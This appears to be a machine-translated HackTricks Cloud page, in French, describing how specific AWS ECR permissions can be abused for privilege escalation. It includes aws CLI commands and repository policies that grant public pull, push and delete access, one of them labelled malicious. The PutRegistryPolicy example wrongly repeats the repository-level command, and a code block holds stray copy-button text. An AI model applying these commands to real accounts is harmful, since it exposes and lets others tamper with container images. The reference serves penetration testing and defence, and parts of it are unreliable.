# AWS - ECR Privesc

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Un attaquant avec les permissions **`ecr:GetAuthorizationToken`** et **`ecr:BatchGetImage`** peut se connecter √† ECR et t√©l√©charger des images.

Pour plus d'informations sur la fa√ßon de t√©l√©charger des images :

{% content-ref url="../aws-services/aws-eks-enum.md" %}
[aws-eks-enum.md](../aws-services/aws-eks-enum.md)
{% endcontent-ref %}

**Impact potentiel :** Privil√®ge indirect en interceptant des informations sensibles dans le trafic.

### `ecr:GetAuthorizationToken`,`ecr:BatchCheckLayerAvailability`,`ecr:CompleteLayerUpload`,`ecr:InitiateLayerUpload`,`ecr:PutImage`,`ecr:UploadLayerPart`

Un attaquant avec toutes ces permissions **peut se connecter √† ECR et t√©l√©charger des images**. Cela peut √™tre utile pour escalader les privil√®ges vers d'autres environnements o√π ces images sont utilis√©es.

Pour apprendre comment t√©l√©charger une nouvelle image/mettre √† jour une image, consultez :

{% content-ref url="../aws-services/aws-eks-enum.md" %}
[aws-eks-enum.md](../aws-services/aws-eks-enum.md)
{% endcontent-ref %}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Comme la section pr√©c√©dente, mais pour les r√©f√©rentiels publics.

### `ecr:SetRepositoryPolicy`

Un attaquant avec cette permission pourrait **modifier la politique du r√©f√©rentiel** pour s'accorder √† lui-m√™me (ou m√™me √† tout le monde) **un acc√®s en lecture/√©criture**.\
Par exemple, dans cet exemple, l'acc√®s en lecture est donn√© √† tout le monde.

```bash
aws ecr set-repository-policy \
    --repository-name <repo_name> \
    --policy-text file://my-policy.json
```

Contenu de `my-policy.json` :

```json
{
    "Version" : "2008-10-17",
    "Statement" : [
        {
            "Sid" : "allow public pull",
            "Effect" : "Allow",
            "Principal" : "*",
            "Action" : [
                "ecr:BatchCheckLayerAvailability",
                "ecr:BatchGetImage",
                "ecr:GetDownloadUrlForLayer"
            ]
        }
    ]
}
```

### `ecr-public:SetRepositoryPolicy`

Comme la section pr√©c√©dente, mais pour les r√©f√©rentiels publics.\
Un attaquant peut **modifier la politique du r√©f√©rentiel** d'un r√©f√©rentiel ECR Public pour accorder un acc√®s public non autoris√© ou pour escalader ses privil√®ges.

```bash
bashCopy code# Cr√©ez un fichier JSON avec la politique de r√©f√©rentiel public malveillante
echo '{
  "Version": "2008-10-17",
  "Statement": [
    {
      "Sid": "MaliciousPublicRepoPolicy",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "ecr-public:GetDownloadUrlForLayer",
        "ecr-public:BatchGetImage",
        "ecr-public:BatchCheckLayerAvailability",
        "ecr-public:PutImage",
        "ecr-public:InitiateLayerUpload",
        "ecr-public:UploadLayerPart",
        "ecr-public:CompleteLayerUpload",
        "ecr-public:DeleteRepositoryPolicy"
      ]
    }
  ]
}' > malicious_public_repo_policy.json

# Appliquer la politique de r√©f√©rentiel public malveillante au r√©f√©rentiel ECR Public
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```

**Impact potentiel :** Acc√®s public non autoris√© au r√©f√©rentiel ECR Public, permettant √† tout utilisateur de pousser, tirer ou supprimer des images.

### `ecr:PutRegistryPolicy`

Un attaquant avec cette permission pourrait **modifier la politique du registre** pour s'accorder √† lui-m√™me, son compte (ou m√™me √† tout le monde) **un acc√®s en lecture/√©criture**.

```bash
aws ecr set-repository-policy \
    --repository-name <repo_name> \
    --policy-text file://my-policy.json
```

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>